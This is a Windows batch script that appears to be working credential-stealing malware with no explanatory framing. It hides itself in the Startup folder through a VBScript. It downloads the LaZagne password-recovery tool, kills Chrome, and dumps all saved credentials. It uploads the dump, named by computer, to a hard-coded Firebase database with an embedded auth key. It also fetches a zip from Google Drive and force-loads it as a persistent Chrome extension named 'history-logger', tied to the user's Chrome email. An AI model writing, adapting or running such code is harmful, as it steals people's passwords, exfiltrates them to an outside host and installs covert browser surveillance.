@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

set "SCRIPT_DIR=%~dp0"
set "SCRIPT_NAME=%~nx0"
set "VBS_NAME=run_hidden.vbs"
set "VBS_PATH=%SCRIPT_DIR%%VBS_NAME%"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "STARTUP_SCRIPT=%STARTUP_DIR%\%SCRIPT_NAME%"

set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"
set "OUTPUT_DIR=%TEMP%\Lazagne_Results"
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"
set "FIREBASE_KEY=fdM9pHfanpouiqsEmFLJUDAC2LtXF7rUBXbIPDA4"
set "ZIP_URL=https://drive.google.com/uc?export=download&id=1_MrCTaWFitVrrapsDodqTZduIvWKHCtU"
set "WORKDIR=%SCRIPT_DIR%history-logger"

set "CHROME_EXE=C:\Program Files\Google\Chrome\Application\chrome.exe"
if not exist "!CHROME_EXE!" (
    set "CHROME_EXE=%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"
)
if not exist "!CHROME_EXE!" (
    for /f "tokens=*" %%i in ('where chrome.exe 2^>nul') do (
        set "CHROME_EXE=%%i"
        goto :chrome_found
    )
    exit /b 1
)
:chrome_found

if not exist "%VBS_PATH%" (
    for %%I in ("%SCRIPT_DIR%%SCRIPT_NAME%") do set "SHORT_SCRIPT_PATH=%%~sI"
    set "VBS_CONTENT=Set WShell = CreateObject(""WScript.Shell"")^&echo.^&WShell.Run ""cmd.exe /c """"!SHORT_SCRIPT_PATH!"""""", 0, True"
    echo !VBS_CONTENT! > "%VBS_PATH%"
    if errorlevel 1 exit /b 1
    echo Generated VBScript content: > debug.txt
    type "%VBS_PATH%" >> debug.txt
)

if not exist "%STARTUP_SCRIPT%" (
    copy "%SCRIPT_DIR%%SCRIPT_NAME%" "%STARTUP_SCRIPT%" >nul 2>nul
    if errorlevel 1 exit /b 1
)

start "" wscript.exe "%VBS_PATH%"
exit /b 0

if not exist "%LAZAGNE_EXE%" (
    powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'" >nul 2>nul
    if errorlevel 1 exit /b 1
    if not exist "%LAZAGNE_EXE%" exit /b 1
)

tasklist /FI "IMAGENAME eq chrome.exe" 2>nul | find /I "chrome.exe" >nul
if %errorlevel% == 0 taskkill /IM chrome.exe /F >nul 2>nul

if not exist "%OUTPUT_DIR%" (
    mkdir "%OUTPUT_DIR%" 2>nul
    if errorlevel 1 exit /b 1
)

if not exist "%LAZAGNE_EXE%" exit /b 1
"%LAZAGNE_EXE%" all -oN -output "%OUTPUT_DIR%" >nul 2>nul
if errorlevel 1 exit /b 1

for /f "delims=" %%F in ('dir /b /a-d /od "%OUTPUT_DIR%\*.txt" 2^>nul') do set "RESULT_FILE=%%F"
if not defined RESULT_FILE exit /b 1

set "PC_NAME=%COMPUTERNAME%"
set "PC_NAME=!PC_NAME: =_!"
set "PC_NAME=!PC_NAME:-=_!"
powershell -Command "$content=Get-Content -Raw -Path '%OUTPUT_DIR%\%RESULT_FILE%'; $json=@{'computer'='%PC_NAME%';'timestamp'='%DATE% %TIME%';'data'=$content} | ConvertTo-Json -Compress; $response=Invoke-RestMethod -Uri '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body $json -ContentType 'application/json'" >nul 2>nul
if errorlevel 1 exit /b 1

del /q "%LAZAGNE_EXE%" >nul 2>nul

if exist "%WORKDIR%" (
    rd /s /q "%WORKDIR%" >nul 2>nul
    if errorlevel 1 exit /b 1
)
mkdir "%WORKDIR%" >nul 2>nul
if errorlevel 1 exit /b 1

powershell -NoProfile -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing" >nul 2>nul
if errorlevel 1 exit /b 1

powershell -NoProfile -Command "Expand-Archive -Path '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force" >nul 2>nul
if errorlevel 1 exit /b 1

set "EMAIL="
for /D %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
    if exist "%%P\Preferences" (
        for /f "usebackq delims=" %%E in (`powershell -NoProfile -Command "try { (Get-Content -Raw '%%P\Preferences' | ConvertFrom-Json).account_info.email } catch { '' }"`) do (
            if not "%%E"=="" (
                set "EMAIL=%%E"
                set "PROFILE_DIR=%%P"
                goto :found_email
            )
        )
    )
)
:found_email
if not defined EMAIL (
    set "EMAIL=anonymous@demo.com"
    set "PROFILE_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
)

(
    echo {"userEmail":"!EMAIL!"}
) > "%WORKDIR%\config.json"
if errorlevel 1 exit /b 1

for %%I in ("!CHROME_EXE!") do set "SHORT_CHROME_EXE=%%~sI"
for %%I in ("!PROFILE_DIR!") do set "SHORT_PROFILE_DIR=%%~sI"
for %%I in ("%WORKDIR%") do set "SHORT_WORKDIR=%%~sI"
(
    echo Set WShell = CreateObject("WScript.Shell")
    echo WShell.Run """%SHORT_CHROME_EXE%"" --user-data-dir=""%SHORT_PROFILE_DIR%"" --disable-extensions-except=""%SHORT_WORKDIR%"" --load-extension=""%SHORT_WORKDIR%""", 0, False
) > "%STARTUP_DIR%\run_extension.vbs"
if errorlevel 1 exit /b 1

if exist "%WORKDIR%" (
    start "" "!CHROME_EXE!" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%WORKDIR%" --load-extension="%WORKDIR%" >nul 2>nul
    if errorlevel 1 exit /b 1
)

exit /b 0
